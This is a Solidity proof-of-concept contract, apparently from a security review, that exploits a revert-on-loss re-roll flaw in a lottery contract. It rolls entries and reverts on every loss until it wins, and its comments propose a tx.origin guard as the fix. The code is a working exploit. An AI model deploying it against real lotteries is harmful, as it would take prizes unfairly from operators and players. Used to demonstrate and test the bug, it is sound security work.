// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.12 <0.9.0;

/// @title RerollAttacker — WHITE-HAT proof-of-concept for the LazyLotto revert-on-loss re-roll bug.
/// @author security review harness (NOT for production use)
/// @notice Demonstrates the "free re-roll" finding: because a roll's win/loss is drawn AND returned
///         inside the same transaction, a contract caller can inspect the outcome and `revert()` on a
///         loss. The revert atomically unwinds the entry consumption (and, for the buy-and-roll path,
///         refunds the fee), so the paid entry survives for unlimited retries until a win — converting
///         the configured win rate into an effective 100%.
///
///         The proposed fix is `require(tx.origin == msg.sender)` on the roll path: an EOA cannot
///         observe-then-revert within its own atomic transaction, and a contract (even one calling
///         from its own constructor) has `tx.origin != msg.sender`, so every method here reverts at
///         the guard once the fix is deployed.
interface ILazyLottoRoll {
    function buyEntry(uint256 poolId, uint256 ticketCount) external payable;

    function rollBatch(
        uint256 poolId,
        uint256 numberToRoll
    ) external returns (uint256 wins, uint256 offset);

    function buyAndRollEntry(
        uint256 poolId,
        uint256 ticketCount
    ) external payable returns (uint256 wins, uint256 offset);
}

contract RerollAttacker {
    ILazyLottoRoll public immutable lotto;

    /// @notice Thrown to discard a losing roll and unwind the whole transaction.
    error LostRollDiscarded();

    constructor(address _lotto) {
        lotto = ILazyLottoRoll(_lotto);
    }

    /// @notice Buy `count` entries as THIS contract (committed in its own tx). Forwards msg.value as
    ///         the HBAR entry fee. After this, userEntries[pool][attacker] == count.
    function buyEntries(uint256 poolId, uint256 count) external payable {
        lotto.buyEntry{value: msg.value}(poolId, count);
    }

    /// @notice Roll `count` pre-bought entries. REVERT on a loss so the transaction unwinds and the
    ///         entry-consumption is rolled back — leaving the entry intact for another attempt. On a
    ///         win, state commits and the prize lands in this contract's pending[].
    /// @return wins The number of winning tickets (always > 0 when this call succeeds).
    function grindRoll(
        uint256 poolId,
        uint256 count
    ) external returns (uint256 wins) {
        (wins, ) = lotto.rollBatch(poolId, count);
        if (wins == 0) {
            revert LostRollDiscarded();
        }
    }

    /// @notice Atomic variant: buy + roll in one tx and revert (refunding the fee) on a loss, so a
    ///         losing attempt costs only gas.
    function grindBuyAndRoll(
        uint256 poolId,
        uint256 count
    ) external payable returns (uint256 wins) {
        (wins, ) = lotto.buyAndRollEntry{value: msg.value}(poolId, count);
        if (wins == 0) {
            revert LostRollDiscarded();
        }
    }

    receive() external payable {}
}
